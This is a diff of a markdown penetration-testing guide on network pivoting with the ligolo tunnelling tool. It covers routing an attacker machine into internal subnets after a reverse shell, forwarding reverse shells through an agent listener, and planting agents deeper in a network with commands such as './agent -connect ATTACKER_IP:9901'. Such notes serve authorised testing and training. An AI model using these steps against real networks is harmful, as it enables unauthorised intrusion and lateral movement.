@@ -57,7 +57,7 @@ echo "done : $b"
 sudo ip route add "$c" dev ligolo
 echo "done : $c"
 
-echo "fuck off now! :)"
+echo "good luck! :)"
 ```
 
 </details>
@@ -87,10 +87,11 @@ TODO :)
 
 ### 1. Accessing the Target Network
 
-Once a connection is establised on the Public Facing Server that is in the Target Network via a reverse shell, it is possible to access/enumerate or exploit any vulnerabilities against a different target in the same network trough ligolo. This allows an attcker to use their very own tools from the attacking machine.
+Once a connection is establised on the Public Facing Server that is in the Target Network via a reverse shell, it is possible to access/enumerate or exploit any vulnerabilities against a different target in the same network trough ligolo (such as a DMZ) or a target that is in a neighbouring network (in the case of a non-segmented network). This allows an attcker to use their very own tools from the attacking machine.
 
 {% hint style="info" %}
-The following method works only when the Target Network has direct access to the attacking machine network, such as in a local network, via port forwarding or a VPN connection
+The following method works only when the Target Network has direct access to the attacking machine network, such as in a local network, via port forwarding or a VPN connection. More advanced pivoting techniques will be detailed below.
+If the attacking machine is in a NAT network, then, port forwarding should implemented.
 {% endhint %}
 
 ```
@@ -118,7 +119,7 @@ start
 
 ### 1.1 Forwarding a reverse shell from the Target Network
 
-Using the Ligolo's Agent Binding/Listening feature, it is possible to recieve a reverse shell connection from a target (in the Target Network) that does not have direct access to the attacking machine. An agent in a compromised server that can communicate with the target can also act as a listner, thus allowing to forward reverse shells through the ligolo tunnel back to the attacking machine.
+Using the Ligolo's Agent Binding/Listening feature, it is possible to recieve a reverse shell connection from a target (in the Target Network) that does not have direct access to the attacking machine (ie. an internet/WAN access). An agent in a compromised server that can communicate with the target can also act as a listner, thus allowing to forward reverse shells through the ligolo tunnel back to the attacking machine.
 
 ```
 # 1. Establish an agent in the Public Facing server via ligolo agent
@@ -135,11 +136,30 @@ listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:8899 --tcp
 ```
 
 {% hint style="info" %}
-In the following example, The reverse shell is initiated from the machine 192.168.0.10 in the target network that do not have direct access to the Attacker machine but to the Public Facing Server. When configuring the reverse shell, the connection must be directed to the Public Facing Server's IP address as it is there were the ligolo agent will start it's listner that was initiated via listner\_add.
+In the following example, The reverse shell is initiated from the machine 192.168.0.10 in the target network that do not have direct access to the Attacker machine but to the Public Facing Server. When configuring the reverse shell, the connection must be directed to the Public Facing Server's IP address as it is were the ligolo agent will start it's listner that was initiated via listner_add.
 {% endhint %}
 
 ![image](https://user-images.githubusercontent.com/90450439/221354631-dbcb392f-af06-49d8-a63c-c5c03201c2cd.png)
 
-### 2. Accessing the Internal Network
+### 1.2. Accessing the Internal Network 
 
-Once a connection is establised on the Public Facing Server that is in the Target Network via a reverse shell, it is possible to access/enumerate or exploit any vulnerabilities against a different target in the same network trough ligolo allowing an attcker to use their very own tools from the attacking machine.
+It is also possible to implant ligolo agents into deeper levels of the network in an organization inorder to compromise additional servers/devices. This follows the simmilar steps that were described for the Public Facing Server. However, this requires once again a reverse shell in the Internal Network or other sorts of foothold as a low privileged user in the internal network. 
+
+```
+# 2. Add a ip route on the attacker machine that will route the target sub network via the ligolo TUN interface
+sudo ip route add 10.10.0.0/24 dev ligolo
+
+# 3. Transfer the ligolo agent binary to the compromised target via wget/scp/pwncat-cs
+
+# 4. Initiate a connection from the ligolo agent to the ligolo proxy
+./agent -connect ATTACKER_IP:9901
+
+# 5. On ligolo, select the agent that you have deployed on the compromised target (ligolo agent)
+
+# 6. Once selected, type : 
+start
+
+//This will now route the sub network 10.10.0.0 via the ligolo TUN interface and through the ligolo tunnel
+//Allowing you to use any tool from the attacking maching against the new target machine
+```
+![image](https://user-images.githubusercontent.com/90450439/224545307-05571c12-31a9-41b7-b8cc-8b4365336e77.png)
